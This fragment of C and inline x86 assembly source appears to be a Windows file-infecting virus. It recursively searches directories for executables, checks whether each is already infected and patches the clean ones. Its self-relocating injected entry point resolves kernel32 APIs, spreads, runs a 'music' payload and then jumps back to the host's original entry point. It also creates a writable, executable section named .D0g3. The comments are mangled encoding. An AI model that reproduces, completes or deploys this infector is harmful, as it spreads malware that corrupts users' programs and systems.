                    if (((tf7_CheckFIle)lpfuncAddr[7])(filePath) == -1)
                    {
                        ((tf5_patchPe)lpfuncAddr[5])(filePath);//���ߴ���
                        (*cnt)++;
                    }
                }
            }
            else if (((tf0_cmp)lpfuncAddr[0])(fileInfo.cFileName, exp3, 1) != 0 && ((tf0_cmp)lpfuncAddr[0])(fileInfo.cFileName, exp3, 2) != 0)//�����Ŀ¼
            {
                ((tf1_cpy)lpfuncAddr[1])(subDirPath, directory, ((tf2_len)lpfuncAddr[2])(directory));
                ((tf13_fcat)lpfuncAddr[13])(subDirPath, &exp3[2]);
                ((tf13_fcat)lpfuncAddr[13])(subDirPath, fileInfo.cFileName);
                ((tf15_FindExeFilesRecursive)lpfuncAddr[15])(subDirPath, cnt); // �ݹ������Ŀ¼
            }
        } while (((tFindNextFileA12)lp_apiAddr[12])(hFind, &fileInfo));
        ((tFindClose13)lp_apiAddr[13])(hFind);
    }
}
void __declspec(naked) __cdecl newEp()//naked�㺯�������ٺ��ͷŶ�ջ�������Լ�д�����������������ʱ��,������entrypoint
{
    DWORD* lpfuncAddr;
    DWORD* lp_apiAddr;
    __asm
    {
        //����Ӱ������ջ
        push eax;
        push ebx;
        push ecx;
        mov  ecx, dword ptr[esp + 12]; //�ѽ����ʱ����Ǹ������ַ������׼���õ�ȫ�ֱ���
        push    ebp;
        mov     ebp, esp;
        sub     esp, 128;

        call label_reloc;
    label_reloc:
        pop ebx;

        lea eax, apiAddr;
        sub eax, label_reloc;//���λ��x;
        add eax, ebx;//ʵ��ip��ַ + ���λ��x;
        mov[eax], ecx; //��������

        //lpfuncAddr=funcAddr;
        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lpfuncAddr;
        mov[ecx], eax;

        //�ض�λlpapiAddr=apiAddr;
        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;


        //�ض�λ��Щ�Լ�д�ĺ���
        push ebx;
        lea ecx, apiAddr;
        sub eax, ecx;
        push eax;//ʵ�ʱ�����ַ - �ϱ�����ַ
        push 16; //����
        lea eax, funcAddr;
        sub eax, label_reloc;
        add eax, ebx;
        push eax;//����

        lea eax, f11_freloc;
        sub eax, label_reloc;
        add eax, ebx;
        call eax;


        //�ض�λ�ַ�����Դ
        pop ebx;
        lea eax, apiAddr;
        sub eax, label_reloc;
        add eax, ebx;
        lea ecx, apiAddr;
        sub eax, ecx;
        push eax;//ʵ�ʱ�����ַ - �ϱ�����ַ
        push 27; //����
        lea eax, szAPIname;
        sub eax, label_reloc;
        add eax, ebx;
        push eax;//����
        lea eax, f11_freloc;
        sub eax, label_reloc;
        add eax, ebx;
        call eax;

        pop ecx;
        pop ebx;
        pop eax;
    }
    ((tf3_GetKernelBase)lpfuncAddr[3])();
    ((tf10_initApi)lpfuncAddr[10])();
    ((tf8_SearchFile2)lpfuncAddr[8])();//��Ҫ��ȡ���˵�ep��

    ((tf12_music)lpfuncAddr[12])();


    lpfuncAddr[16] += ((tGetModuleHandleA14)lp_apiAddr[14])(0);
    __asm
    {
        //��һ�����ɹ����ֵ�ʱ��,��д��oep
        mov eax, lpfuncAddr;
        add eax, 4 * 16;
        mov eax, [eax];

        //�ͷ�ջ
        mov     esp, ebp;//�����ͷŶ�ջ,��Ϊǰ�濪����,���ü����õ�
        pop     ebp;

        jmp eax;

        //��ǰ���,û�����ֳɹ���ʱ��,���ᶯoep
        //��ǰ���,���ֳɹ���ʱ��,��Ӧ���ƻ�oep,���ǿ��Զ�,����Ҫ�ָ�

    }
}
#pragma code_seg()
#pragma comment(linker, "/SECTION:.D0g3,ERW")
int main() // newEp() 
{
    printf("EP:%08X\n", (DWORD32)newEp);
    apiAddr[0] = LoadLibraryA("kernel32.dll");
    if (apiAddr[0] == 0)
    {
        return 0;
    }
    f10_initApi();
    f8_SearchFile2();
    return 0;
}